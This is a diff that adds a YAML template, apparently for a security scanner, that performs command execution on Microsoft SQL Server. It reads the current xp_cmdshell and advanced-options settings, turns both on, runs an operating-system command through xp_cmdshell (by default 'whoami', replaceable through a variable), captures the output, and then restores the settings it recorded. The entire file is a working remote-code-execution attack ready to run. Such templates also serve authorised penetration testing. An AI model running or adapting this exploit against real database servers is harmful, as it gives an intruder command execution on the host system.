@@ -1,0 +1,43 @@
+id: mssql-xpcmdshell-exec
+service: [mssql]
+variables:
+  cmd: whoami
+info:
+  name: MSSQL xp_cmdshell Command Execution
+  severity: critical
+  tags: mssql,exploit,rce,xpcmdshell
+
+services:
+  - ops:
+      - db: "SELECT 'xp_status=' + CAST(value_in_use AS varchar(10)) FROM sys.configurations WHERE name = 'xp_cmdshell'"
+        name: xp_check
+      - db: "SELECT 'adv_status=' + CAST(value_in_use AS varchar(10)) FROM sys.configurations WHERE name = 'show advanced options'"
+        name: adv_check
+    extractors:
+      - type: regex
+        name: xp_orig
+        internal: true
+        part: xp_check
+        regex: ['(?m)^xp_status=([01])']
+        group: 1
+      - type: regex
+        name: adv_orig
+        internal: true
+        part: adv_check
+        regex: ['(?m)^adv_status=([01])']
+        group: 1
+
+  - ops:
+      - db: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE"
+      - db: "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"
+      - db: "EXEC xp_cmdshell '{{cmd}}'"
+        name: cmd_output
+    extractors:
+      - type: regex
+        name: mssql_xpcmdshell_result
+        part: cmd_output
+        regex: ['(?m)^(.+)$']
+
+  - ops:
+      - db: "EXEC sp_configure 'xp_cmdshell', {{xp_orig}}; RECONFIGURE"
+      - db: "EXEC sp_configure 'show advanced options', {{adv_orig}}; RECONFIGURE"
